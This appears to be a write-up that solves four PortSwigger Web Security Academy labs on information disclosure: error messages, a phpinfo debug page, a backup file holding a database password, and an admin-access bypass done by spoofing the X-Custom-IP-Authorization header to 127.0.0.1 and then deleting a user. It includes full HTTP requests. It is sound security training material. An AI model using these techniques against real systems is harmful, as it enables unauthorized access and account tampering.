## Labs Covered

This write-up focuses on the following **APPRENTICE-level labs** from the PortSwigger Web Security Academy:

**1 Information disclosure in error messages**  
  <blockquote>
  This lab demonstrates how verbose or detailed error messages can leak sensitive information that attackers can use to facilitate further attacks.
  </blockquote>

 **2 Information disclosure on debug page**  
  <blockquote>
  This lab shows how leaving debug or development pages accessible in production can expose sensitive internal information useful to attackers.
  </blockquote>

**3 Source code disclosure via backup files** 
 <blockquote>
  This lab demonstrates how improperly secured backup files can expose full or partial source code, providing attackers with valuable information for identifying vulnerabilities.
 </blockquote>


**4 Authentication bypass via information disclosure**  
 <blockquote>
  This lab shows how attackers can exploit leaked sensitive information to bypass authentication mechanisms and gain unauthorized access.
 </blockquote>

---

## LAB 1 - Information disclosure in error messages

### Lab Description :

![image](https://github.com/user-attachments/assets/92c67db1-6fb6-49df-a9d1-832f4d41e319)


### Solution :

 We have an eCommerce site that uses Product IDs to track its products. When you select a project, the URL presents ?**productID=1** as a parameter. By modifying your request to use a non-valid number, we’re able to trigger an error message that leaks the Apache version.

![image](https://github.com/user-attachments/assets/d1e7ce7b-9a95-4858-8927-28c6652c0408)


At the end of the response, we have the name & version of the software that is being used in the backend - Apache Struts 2 2.3.31

Submit the answer to solve the lab.

![image](https://github.com/user-attachments/assets/fd1c3a35-0233-4fdb-bb38-0c984a763b4c)


---

## LAB 2 - Information disclosure on debug page

### Lab Description :

![image](https://github.com/user-attachments/assets/be33ee5e-bd4e-4e17-93ee-0c1de716758a)

### Solution :

We’re able to leverage Burp Suite to crawl the site and look for comments in the source code. One of the comments hint at a directory present at **/cgi-bin/phpinfo.php**. Browsing to this allows us to enumerate a wealth of information about the website.


To automate hunting for comments, you can use Burp:
1. Navigate to Target and select Site Map.
2. Right click the correct target, select Engagement Tools, and select Find Comments.

![image](https://github.com/user-attachments/assets/f50759ba-27eb-4031-9f7d-0ba5d5c09824)

 Find comments. The following dialog box appears which contains below comment.

![image](https://github.com/user-attachments/assets/27d282c8-965a-4250-bfb3-098a7ccc2e40)

From that , we can see that there is a href pointing to **/cgi-bin/phpinfo.php**.

Send the request to repeater(add the path /cgi-bin/phpinfo.php),

```
GET /cgi-bin/phpinfo.php HTTP/2
Host: 881c6ac5600a70043e3e0.web-security-academy.net
Cookie: session=3Y9b24AoTm8tC85I8NxLp0pXbmPiOYIi
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
```

In the response we can see that lot of information is revealed including the value of `SECRET_KEY` - 

```html
<tr>
  <td class="e">SECRET_KEY </td>
  <td class="v">dsidshdue7487reu9832nde3ew</td>
</tr>
```

Submit the key to solve the lab.
![image](https://github.com/user-attachments/assets/c38b49d6-c43c-4bdb-8c96-16c52e8daf1d)

---

## LAB 3 - Source code disclosure via backup files

### Lab Description :

![image](https://github.com/user-attachments/assets/bac114a0-6940-412f-a97a-9ca3b84efa3b)


### Solution :

In this example, ***robots.txt** shows us a /backup directory. That directory allows for listing to anybody, so we’re able to see a backup file in **.bak** format. Viewing the contents of this file reveals a hardcoded credential in plain text.

Always check **robots.txt** and source code.

![image](https://github.com/user-attachments/assets/fd2d7a09-df54-4704-a1ab-46d8f57db159)

Browsing to that directory /backup brings us to a page of code with a leaked postgres password.

![image](https://github.com/user-attachments/assets/b5dd8c40-e642-4066-bce6-27df0256a0e2)

The above code uses ConnectionBuilder class to establish a connection to a PostgreSQL database. There we can see a random string [mm3........................] which might be the database password that is used to establish the connection.

Submit the db_password to solve the lab.

![image](https://github.com/user-attachments/assets/6775c2cb-291a-417c-9b5b-f0cb52570b46)

---

## LAB 4 - Authentication bypass via information disclosure

### Lab Description :

![image](https://github.com/user-attachments/assets/91a29e73-238e-4e7d-b71d-c9a403223411)


### Solution :

In order to  bypass the authentication & have admin access, we have to check what HTTP methods are used.

First let's try **OPTIONS** header to see what HTTP headers are allowed in this request but sadly it didn't return anything.

So next, we will try each of the methods **PUT,PATCH,DELETE,TRACE**.

All the headers gave nothing interesting in response except **TRACE**.

The  request sent is as follows

```http
TRACE /my-account?id=carlos HTTP/2
Host: ac7elfS5le6c101460675192007600ba.web-security-academy.net
Cookie: session=Cg9Tz6WFnRqBebiW7cfpYpvb1QUuybt8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://ac7elfS5le6c101460675192007600ba.web-security-academy.net/login
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
```

The response with `TRACE` http header was,

```http
HTTP/2 200 OK
Content-Type: message/http
X-Frame-Options: SAMEORIGIN
Content-Length: 696

TRACE /my-account?id=carlos HTTP/1.1
Host: ac7elfS5le6c101460675192007600ba.web-security-academy.net
user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
accept-language: en-US,en;q=0.5
accept-encoding: gzip, deflate
referer: https://ac7elfS5le6c101460675192007600ba.web-security-academy.net/login
upgrade-insecure-requests: 1
sec-fetch-dest: document
sec-fetch-mode: navigate
sec-fetch-site: same-origin
sec-fetch-user: ?1
te: trailers
cookie: session=Cg9Tz6WFnRqBebiW7cfpYpvb1QUuybt8
Content-Length: 0
X-Custom-IP-Authorization: 152.58.224.8
```

> **TRACE** method **echoes  the exact same request that was received in the response** . This behavior is often harmless, but occasionally leads to *information disclosure*, such as the name of internal authentication headers that may be appended to requests

From the above response, we can understand that **X-Custom-IP-Authorization** header is supported . So we can use it in the request.

> NOTE - By using `X-Custom-Authorization` header we can spoof our IP addresses. EG- `X-Custom-Authorization: 127.0.0.1`

So if we spoof our IP as localhost, maybe sometimes the website will not validate it since it is coming from a trusted server. So by this way it will help us access the admin panel without admin credentials.

We now send a request like this below,

```http
GET /my-account?id=carlos HTTP/2
Host: ac7elfS5le6c101460675192007600ba.web-security-academy.net
Cookie: session=dsewcRqBebiW7cfpYpvb1QUuybt8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://ac7elfS5le6c101460675192007600ba.web-security-academy.net/login
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
X-Custom-Ip-Authorization: 127.0.0.1
```

In the response we have a link to `/admin` panel

```
<a href="/admin">Admin panel</a><p>|</p>
<a href="/my-account?id=wiener">My account</a><p>
```
Now send another request to access `/admin` panel  with the same X-Custom-Authorization header.  

![image](https://github.com/user-attachments/assets/d559eab9-0aaa-46ad-b808-3ff15bb52067)

In the reponse we get the href link to delete user carlos .

```html
                       <div>
                            <span>carlos - </span>
                            <a href="/admin/delete?username=carlos">Delete</a>
                        </div>
```

Again one last time, send a *POST* request to `/admin/delete?username=carlos` endpoint (along with the custom header) to delete user carlos & Solve the lab.

![image](https://github.com/user-attachments/assets/18c7063d-65e8-44d3-897f-ef16771aa97a)


